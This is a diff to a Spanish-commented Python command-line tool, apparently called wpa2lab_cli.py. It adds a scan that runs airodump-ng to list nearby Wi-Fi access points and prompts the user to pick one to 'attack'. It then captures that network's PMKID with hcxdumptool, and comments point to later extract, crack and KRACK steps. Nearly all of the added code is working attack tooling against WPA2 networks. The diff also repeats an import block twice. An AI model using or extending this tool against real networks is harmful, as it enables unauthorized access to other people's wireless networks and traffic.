@@ -20,6 +20,11 @@ chmod +x wpa2lab_cli.py
 ```
 """
 from __future__ import annotations
+import csv, time, signal
+from rich.prompt import Prompt
+
+import csv, time, signal
+from rich.prompt import Prompt
 
 import logging
 import re
@@ -168,6 +173,123 @@ def patch_config(template: Path, iface: str, tool: str) -> Path:
 # ---------------------------------------------------------------------------
 # Commands
 # ---------------------------------------------------------------------------
+# ───────────────────────── helper nuevo y correcto ───────────────────────────
+def scan_aps(monitor: str, duration: int = 6) -> list[dict]:
+    """
+    Lanza airodump-ng durante *duration* segundos y devuelve
+    una lista de APs ordenada por potencia.
+    """
+    # fichero temporal para el CSV
+    tmp = tempfile.NamedTemporaryFile(prefix="scan_", suffix=".csv", delete=False)
+    base = tmp.name[:-4]           # quitamos '.csv'; airodump añade -01.csv
+    tmp.close()
+
+    # capturamos
+    proc = subprocess.Popen(
+        ["sudo", "airodump-ng", monitor,
+         "--output-format", "csv", "--write-interval", "1",
+         "--write", base],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    time.sleep(duration)
+    proc.send_signal(signal.SIGINT)     # Ctrl-C suave para cerrar CSV
+    proc.wait()
+
+    csv_file = f"{base}-01.csv"
+    aps: list[dict] = []
+
+    # ── parseo robusto ────────────────────────────────────────────────
+    reading_aps = False
+    with open(csv_file, newline="", errors="ignore") as fh:
+        reader = csv.reader(fh)
+        for row in reader:
+            if not row:                     # línea en blanco
+                if reading_aps:             # fin de la tabla APs
+                    break
+                continue
+
+            if row[0].strip() == "BSSID":   # cabecera → empieza la tabla
+                reading_aps = True
+                continue
+
+            if not reading_aps:             # aún no estamos dentro
+                continue
+
+            if len(row) >= 14:              # fila de AP
+                aps.append({
+                    "essid":   row[13].strip() or "<Hidden>",
+                    "bssid":   row[0].strip(),
+                    "channel": row[3].strip(),
+                    "crypto":  row[5].strip(),
+                    "power":   int(row[8].strip() or "-99"),
+                })
+
+    # ordenamos por potencia (desc) para que los más cercanos salgan arriba
+    aps.sort(key=lambda x: x["power"], reverse=True)
+    return aps
+
+
+# ────────────────────────────────────────────
+TARGET: dict | None = None    # se usará después en extract/crack/krack
+
+@app.command()
+def scan(
+    secs: int = typer.Option(8, "--secs", "-s", help="Segundos de escaneo airodump"),
+    pcap: Path = typer.Option("dump.pcapng", "--out", "-o", help="PCAP de salida"),
+):
+    """
+    Escanea redes → eliges una → captura PMKID del objetivo.
+    """
+    global TARGET
+    ensure_tool("airodump-ng", "aircrack-ng")
+    ensure_tool("hcxdumptool", "hcxdumptool")
+
+    mon = current_monitor_iface()
+    if not mon:
+        console.print("[red]Primero ejecuta 'prepare' para activar modo monitor.[/red]")
+        raise typer.Exit(1)
+
+    # 1) Escaneo rápido
+    console.print(Panel.fit("[bold]Escaneando redes…[/bold]", style="green"))
+    aps = scan_aps(mon, secs)
+    if not aps:
+        console.print("[red]No se encontraron APs. Prueba de nuevo.[/red]")
+        raise typer.Exit(1)
+
+    table = Table(title="Redes detectadas", show_lines=True)
+    table.add_column("#", style="cyan", width=3)
+    table.add_column("ESSID", width=20)
+    table.add_column("BSSID", width=20)
+    table.add_column("CH", width=4)
+    table.add_column("Cripto", width=8)
+    for i, ap in enumerate(aps):
+        table.add_row(str(i), ap["essid"], ap["bssid"], ap["channel"], ap["crypto"])
+    console.print(table)
+
+    choice = int(Prompt.ask("Número de AP a atacar", default="0"))
+    TARGET = aps[choice]
+    console.print(
+        Panel.fit(
+            f"[green]Objetivo:[/green] {TARGET['essid']} ({TARGET['bssid']} · CH {TARGET['channel']})",
+            title="✔ Seleccionado"
+        )
+    )
+
+    # 2) Captura PMKID enfocada
+    console.print(Panel.fit(f"[bold]Capturando PMKID → {pcap}[/bold]", style="green"))
+    try:
+        run([
+            "hcxdumptool",
+            "-i", mon,
+            "-c", TARGET["channel"],
+            "-t", TARGET["bssid"],
+            "-w", str(pcap)
+        ], sudo=True)
+    except KeyboardInterrupt:
+        pass
+
+    console.print(f"[bold green]✓[/] Captura terminada ([cyan]{pcap}[/])")
+
 
 @app.command()
 def prepare(
@@ -363,6 +485,7 @@ def all(
 # ---------------------------------------------------------------------------
 # Entry point
 # ---------------------------------------------------------------------------
+
 
 if __name__ == "__main__":
     try:
